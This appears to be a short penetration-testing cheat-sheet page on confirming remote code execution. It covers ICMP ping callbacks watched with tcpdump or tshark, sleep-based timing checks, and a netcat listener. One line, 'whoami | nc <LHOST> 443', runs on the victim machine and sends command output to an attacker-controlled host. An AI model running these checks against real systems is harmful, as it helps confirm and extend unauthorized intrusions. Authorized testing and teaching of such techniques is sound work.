# RCE Check

{% tabs %}
{% tab title="ICMP check" %}
```bash
# tcpdump
tcpdump -i tun0 icmp # We can also test by disabling DNS resolution with -n
tcpdump ip proto \\icmp -i tun0
# tshark
tshark -i tun0 -Y "icmp" 2>/dev/null
```

```bash
ping -c 1 <LHOST> # Linux
ping <LHOST> # Windows
```
{% endtab %}

{% tab title="NC check" %}
```bash
nc -nvlp 443 # In our machine.
whoami | nc <LHOST> 443 # On the victim machine, to send the result.
```
{% endtab %}

{% tab title="Time check" %}
```bash
sleep 5 # Linux
timeout 5 # Windows
```
{% endtab %}
{% endtabs %}
